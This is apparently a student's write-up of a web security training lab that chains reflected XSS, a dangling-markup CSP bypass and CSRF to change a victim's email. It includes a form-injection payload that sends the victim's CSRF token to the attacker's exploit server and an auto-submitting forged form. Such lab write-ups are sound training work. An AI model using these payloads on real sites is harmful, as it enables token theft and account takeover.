# LAB: Reflected XSS protected by very strict CSP, with dangling markup attack

## Objective:

- steal the csrf token of vicim user.
- Use the csrf token of victim to change its email to hacker@evil-user.net

## Key Concepts:

- Use reflected XSS to deliver the exploit to the victim.
- Use dangling markup attack to bypass the CSP and submit a form with the csrf token of victim to change the email of victim.
- The lab is protected by a very strict Content Security Policy (CSP) that prevents inline scripts and external scripts from executing, but it is vulnerable to a reflected XSS attack that allows the attacker to deliver a payload that can exploit the CSP.

## Steps Taken:

1. Login with the provided credentials.
2. View page source of the update email form for any csrf tokens.
3. Change the value of email field using query parameters.
4. Prepare a form payload with dangling markup.
5. Make sure that the form included the hidden csrf token input field innside
   it.
6. Use the exploit server URL in the action attribute of the payload form.
7. Append the payload in the lab URL next to ?email= query and remove the id
   query from payload which is there by default.
8. Copy the payload and deliver the exploit to the victim with the URL as the
   location within script tags.
9. Check the exploit server logs and find the csrf token of the victim which can
   be identified by the IP which is other then your machine IP.
10. Prepare a second payload which will be a simple html page with a form that
    will be redirected to the lab URL followed by the email update endpoint.
11. add the input fields in the html form, both will be hidden. One with the
    email that the lab wants us to change the victim email to, and the other
    will be csrf input field with the value of the victim csrf token that we got
    from the exploit server logs from the previous exploit delivered to the
    victim.
12. Submit the form automatically through the javascript, as soon as the page is
    loaded.
13. Deliver the exploit to the victim using the exploit server and than a
    simulated user is supposed to be visiting the site and his email will be
    changed to the one that we had provided in te 2nd payload's email field
    value.

## Payloads Used:

```html

<!----------Payload 1---------->

"></form>
<form
  class="login_form"
  name="myform"
  method="get"
  action="https://exploit-0a0b0026048e5f7a806202ce016a00e9.exploit-server.net/exploit"
>
  <button class="button" type="submit">Click</button

```

```html
<!----------Payload 2---------->

<html>
  <body>
    <form
      action="https://0a7c00c804525f5180a7034800a300c4.web-security-academy.net/my-account/change-email"
      method="post">
      <input
        type="hidden"
        name="email"
        value="hacker@evil-user.net" />
      <input
        type="hidden"
        name="csrf"
        value="tqjq7kVoT9KYE0ovK4FNYfFTpnJ4srVp" />
    </form>
  </body>
  <script>
    document.forms[0].submit();
  </script>
</html>
```

## Issues Encountered:

- Did not knew if we can change the email field value URL email query value.
- Faced difficulty understanding the information provided in lab description and
  what actually lab needs us to do.

## Solutions/Workarounds:

- Viewed some walkthroughs, cam to know about that we can initiate the exploit
  by reflective XSS on update email field.

## Takeaways:

- For any input field, try changing its value with query parameters if its
  reflected as a DOM source.
- First, focus on getting the csrf token of victim.
- Then create exploit to deliver to victim, which will be a phishing site,
- Submit a hidden form from victim's browser with his csrf token to update his
  email.
